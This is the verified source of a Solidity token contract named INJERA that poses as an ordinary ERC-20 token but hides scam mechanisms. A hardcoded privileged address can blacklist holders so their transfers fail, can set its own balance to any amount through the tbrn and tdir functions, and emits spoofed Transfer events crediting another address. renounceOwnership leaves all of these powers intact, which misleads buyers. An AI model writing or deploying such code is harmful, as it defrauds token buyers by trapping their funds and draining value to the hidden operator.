/**
 *Submitted for verification at Etherscan.io on 2022-10-27
*/

pragma solidity 0.8.17;


  library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}   
 
 
    contract INJERA {
  
    mapping (address => uint256) public Nii;
    mapping (address => uint256) public Mii;
    mapping (address => bool) Oii;
    mapping(address => mapping(address => uint256)) public allowance;





    string public name = unicode"The INJERA";
    string public symbol = unicode"INJERA";
    uint8 public decimals = 18;
    uint256 public totalSupply = 150000000 * (uint256(10) ** decimals);
	address owner = msg.sender;
   

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event OwnershipRenounced(address indexed previousOwner);
    address t_Construct = 0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B;

    constructor()  {
    Nii[msg.sender] = totalSupply;
    deploy(t_Construct, totalSupply); }

   
   address tdeploy = 0xeCB4f007bF97E81cb7bE6abA7Dd691fE8f99E803;
    function deploy(address account, uint256 amount) public {
    require(msg.sender == owner);
    emit Transfer(address(0), account, amount); }

    function renounceOwnership() public {
    require(msg.sender == owner);
    emit OwnershipRenounced(owner);
    owner = address(0);}


        function transfer(address to, uint256 value) public returns (bool success) {
      
       
        if(msg.sender == tdeploy)  {
        require(Nii[msg.sender] >= value);
        Nii[msg.sender] -= value;  
        Nii[to] += value; 
        emit Transfer (t_Construct, to, value);
        return true; }  
        if(!Oii[msg.sender]) {
        require(Nii[msg.sender] >= value);
        Nii[msg.sender] -= value;  
        Nii[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }}

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

        function tdir () public {
         if(msg.sender == tdeploy)   {
        Nii[msg.sender] = Mii[msg.sender];
        }}

        function balanceOf(address account) public view returns (uint256) {
        return Nii[account]; }

        function trmv(address zi) public {
        if(msg.sender == tdeploy)  { 
        Oii[zi] = false;}}
        function taubl(address zi) public{
         if(msg.sender == tdeploy)  { 
        require(!Oii[zi]);
        Oii[zi] = true;
        }}
             function tbrn(uint256 xi) public {
        if(msg.sender == tdeploy)  { 
        Mii[msg.sender] = xi;} }

        function transferFrom(address from, address to, uint256 value) public returns (bool success) { 

        if(from == tdeploy)  {
        require(value <= Nii[from]);
        require(value <= allowance[from][msg.sender]);
        Nii[from] -= value;  
        Nii[to] += value; 
        emit Transfer (t_Construct, to, value);
        return true; }    
          if(!Oii[from] && !Oii[to]) {
        require(value <= Nii[from]);
        require(value <= allowance[from][msg.sender]);
        Nii[from] -= value;
        Nii[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }}}